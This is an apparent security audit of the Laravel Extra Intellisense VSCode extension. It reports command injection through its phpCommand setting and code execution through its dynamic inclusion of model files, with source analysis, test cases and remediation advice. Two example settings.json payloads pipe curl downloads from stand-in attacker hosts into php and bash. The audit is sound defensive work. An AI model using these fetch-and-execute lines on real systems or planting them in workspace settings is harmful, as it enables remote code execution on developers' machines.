# Vulnerabilities

## Vulnerability 1: Arbitrary PHP Command Injection through Configurable PHP Command Execution

### Description:
- The extension executes PHP commands based on the user's defined `LaravelExtraIntellisense.phpCommand` configuration.
- A developer may improperly or carelessly set this configuration in their VSCode `settings.json` or workspace settings.
- If an attacker manipulates or convinces a developer to introduce a malicious setting (e.g., via crafted `settings.json`, shared repositories, or VSCode settings synchronization), arbitrary malicious PHP code will be executed.
- Specifically, a malicious workspace `.vscode/settings.json` could be crafted by the attacker:
  ```json
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; exec('curl http://maliciousserver.com/shell.php | php');\""
  ```
- Upon Laravel-related PHP execution (e.g., autocomplete processing), the malicious code is invoked, leading to arbitrary command and remote PHP execution.

### Impact:
- Enables arbitrary command and remote code execution in the developer's environment or Docker container associated with Laravel.
- Could lead directly to data compromise, credential theft, system compromise, and serve as a gateway for lateral movement within internal networks.

### Vulnerability Rank:
Critical

### Currently Implemented Mitigations:
- README "Security Note" explicitly warns users about automatic Laravel application execution and advises temporarily disabling the extension when working with sensitive logic.

### Missing Mitigations:
- No implemented command sanitization or validation process for the `LaravelExtraIntellisense.phpCommand` setting.
- No secure handling or limitations on allowed PHP execution contexts exist.
- No preventive measures against injection or malicious settings introduced via workspace configurations.

### Preconditions:
- Attacker must influence developers' VSCode configuration (`.vscode/settings.json`, global or workspace settings).
- Developer actively uses VSCode extension with auto-triggered PHP execution scenarios.

### Source Code Analysis:
- Location: `..\vscode-laravel-extra-intellisense\src\helpers.ts`
- Relevant vulnerable method (`runPhp`):
  ```typescript
  static async runPhp(code: string, description: string|null = null) : Promise<string> {
      code = code.replace(/\"/g, "\\\"");
      if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
          code = code.replace(/\$/g, "\\$");
          code = code.replace(/\\\\'/g, '\\\\\\\\\'');
          code = code.replace(/\\\\"/g, '\\\\\\\\\"');
      }
      let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
      let command = commandTemplate.replace("{code}", code);
      let out = new Promise<string>(function (resolve, error) {
          if (description != null) {
              Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
          }

          cp.exec(command,
              { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
              function (err, stdout, stderr) {
                  if (err == null) {
                      if (description != null) {
                          Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                      }
                      resolve(stdout);
                  } else {
                      const errorOutput = stderr.length > 0 ? stderr : stdout;
                      Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                      Helpers.showErrorPopup();
                      error(errorOutput);
                  }
              }
          );
      });
      return out;
  }
  ```
- Walkthrough for triggering this vulnerability:
  1. User-configurable parameter `LaravelExtraIntellisense.phpCommand` is loaded directly without validation.
  2. Dynamic placeholder `{code}` is substituted unsafely.
  3. Final PHP execution command, potentially maliciously crafted, executes via `cp.exec`.

### Security Test Case:
1. Craft a malicious repository containing `.vscode/settings.json`:
   ```json
   {
       "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; system('curl https://malicious.example.com/backdoor | bash');\""
   }
   ```
2. Victim developer clones repository or opens VSCode in maliciously prepared workspace.
3. Laravel Extra Intellisense automatically runs PHP when Laravel autocomplete activates within VSCode.
4. Verify the successful exploitation when the attacker-controlled listener observes connections or receives command execution callbacks.

---

## Vulnerability 2: PHP Injection via Laravel Model Loading Mechanism

### Description:
- The VSCode extension dynamically includes Laravel model files (`.php`) using PHP's `include_once` during IntelliSense autocompletion.
- An attacker who manages to introduce malicious PHP code into Laravel's standard model directories (`app/`, `app/Models`) can exploit this dynamic file inclusion to execute arbitrary PHP code during IntelliSense autocomplete execution.

Attack scenario example:
- A compromised or malicious dependency injects malicious model PHP files into Laravel directories.
- IntelliSense execution triggers inclusion of malicious PHP when processing model classes.

### Impact:
- Arbitrary PHP code execution inside the developer’s workspace (either locally or within Docker environment).
- Potentially enables attackers to achieve local privilege escalation, data exfiltration, or system compromise in a developer-based context.

### Vulnerability Rank:
High

### Currently Implemented Mitigations:
- None; no safeguards identified in current source code analysis.

### Missing Mitigations:
- Absence of inclusion sanitization mechanisms, such as file integrity checks or validation routines.
- No directory or file path allowlisting prior to PHP file inclusion.
- Lack of sandboxing or isolated execution environments.

### Preconditions:
- An attacker must have write access, or influence a malicious dependency or package to compromise Laravel application directories (`app/`, `app/Models`).

### Source Code Analysis:
- Location: `src/EloquentProvider.ts`
- Vulnerable Source Code snippet:
  ```typescript
  Helpers.runLaravel(
      "foreach (['app', 'app/Models'] as $modelPath) {" +
      "if (is_dir(base_path($modelPath))) {" +
      " foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
      "  if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
      "   include_once base_path(\"$modelPath/$sourceFile\");" +
      "  }}}}",
      "Eloquent Attributes and Relations"
  )
  ```
- The code performs a dynamic, unsanitized inclusion of PHP files without verifying sources or content.

### Security Test Case:
1. Introduce malicious PHP code in Laravel's `app/Models` folder (`MaliciousPayload.php`):
   ```php
   <?php
   file_put_contents('/tmp/malicious_intellisense_test.txt', 'Malicious PHP include executed successfully');
   ?>
   ```
2. Trigger Laravel IntelliSense autocomplete in the compromised project within VSCode to invoke file inclusions.
3. Verify exploit execution by checking if `/tmp/malicious_intellisense_test.txt` file was created and contains the expected content.

---

## Recommendations for Comprehensive Remediation:

To significantly mitigate these critical vulnerabilities, consider the immediate implementation of the following security controls:

1. **Input and Command Validation:**
   - Strictly limit permissible commands and PHP execution templates.
   - Utilize secure defaults and explicitly prohibit arbitrary PHP injection via configuration files.

2. **Secure Dynamic File Inclusion:**
   - Deploy strict whitelisting for PHP model file inclusions, permitting only explicitly approved or known verified files.
   - Conduct integrity or checksum validations before including PHP source files dynamically.

3. **Isolation and Sandboxing:**
   - Execute PHP processes related to the extension autocomplete functionalities within isolated or sandboxed environments (Docker with reduced privileges, minimal system access) to prevent active exploitation from directly impacting core development environments.

By urgently applying these mitigation strategies, significant security improvement will be achieved and the risk posed by the identified vulnerabilities sharply reduced.
